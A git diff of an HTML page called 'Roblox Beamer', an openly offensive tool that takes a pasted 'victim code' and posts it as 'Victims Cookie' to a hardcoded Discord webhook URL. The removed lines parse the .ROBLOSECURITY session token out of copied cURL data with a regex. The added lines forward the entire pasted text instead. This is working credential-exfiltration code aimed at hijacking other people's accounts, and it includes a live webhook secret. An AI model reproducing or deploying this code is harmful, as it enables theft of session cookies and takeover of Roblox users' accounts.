@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>testRoblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,8 +36,8 @@
     button:hover:not(:disabled) {
       background-color: #0056b3;
     }
-    #status {
-      color: green;
+    .error {
+      color: red;
       font-weight: bold;
     }
   </style>
@@ -48,74 +48,58 @@
     <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea>
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
-  <p id="status"></p>
+  <p id="status" style="color: green; font-weight: bold;"></p>
+  <p id="errorMessage" class="error"></p>
 
   <script>
     // Replace with your Discord Webhook URL
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";
 
-    const cooldownTime = 2; // Cooldown duration in seconds
+    const cooldownTime = 120; // Cooldown duration in seconds
     const cooldownKey = "sendCooldown"; // Key for localStorage
 
     function sendMessage() {
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
+      const errorMessage = document.getElementById("errorMessage");
       let message = messageInput.value;
 
-      // Extract the .ROBLOSECURITY token from the copied cURL data
-      const robloSecurityCode = extractRobloSecurityToken(message);
+      errorMessage.textContent = ""; // Clear any previous error messages
 
-      if (robloSecurityCode) {
-        // Create the embed payload with only the _ROBLOSECURITY code
-        const embedPayload = {
-          embeds: [
-            {
-              title: "Victims Cookie", // Embed title
-              description: `\`\`\`${robloSecurityCode}\`\`\``, // Embed description with the token wrapped in backticks
-              color: 16711680, // Embed color (red in this case)
-              timestamp: new Date().toISOString() // Adds a timestamp
-            }
-          ]
-        };
+      // Add triple backticks around the message for Discord code block format
+      message = `\`\`\`${message}\`\`\``;
 
-        // Send the embed to Discord webhook
-        fetch(DISCORD_WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(embedPayload),
+      // Create the embed payload
+      const embedPayload = {
+        embeds: [
+          {
+            title: "Victims Cookie", // Embed title
+            description: message, // Embed description with backticks
+            color: 16711680, // Embed color (red in this case)
+            timestamp: new Date().toISOString() // Adds a timestamp
+          }
+        ]
+      };
+
+      // Send the embed to Discord webhook
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embedPayload),
+      })
+        .then((response) => {
+          if (response.ok) {
+            document.getElementById("status").textContent = "Message sent successfully!";
+            messageInput.value = ""; // Clear the input
+            startCooldown(sendButton); // Start cooldown timer
+          } else {
+            throw new Error("Failed to send the message.");
+          }
         })
-          .then((response) => {
-            if (response.ok) {
-              document.getElementById("status").textContent = "Message sent successfully!";
-              messageInput.value = ""; // Clear the input
-              startCooldown(sendButton); // Start cooldown timer
-            } else {
-              throw new Error("Failed to send the message.");
-            }
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-            document.getElementById("status").textContent = "Failed to send the message.";
-          });
-
-      } else {
-        // If the _ROBLOSECURITY cookie is not found, just clear the input without an error message
-        messageInput.value = "";
-        document.getElementById("status").textContent = "Invalid cURL data or no Roblox token found.";
-      }
-    }
-
-    function extractRobloSecurityToken(curlText) {
-      // Clean up the text to ignore warning parts or comments
-      let cleanedText = curlText.split("|WARNING")[0];  // Remove warning part
-      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9|_|-]+)(?=;|$)/;
-      const match = cleanedText.match(robloSecurityCodeRegex);
-
-      if (match && match[1]) {
-        return match[1]; // Return the token if found
-      } else {
-        return null; // Return null if the token is not found
-      }
+        .catch((error) => {
+          console.error("Error:", error);
+          document.getElementById("status").textContent = "Failed to send the message.";
+        });
     }
 
     function startCooldown(button) {
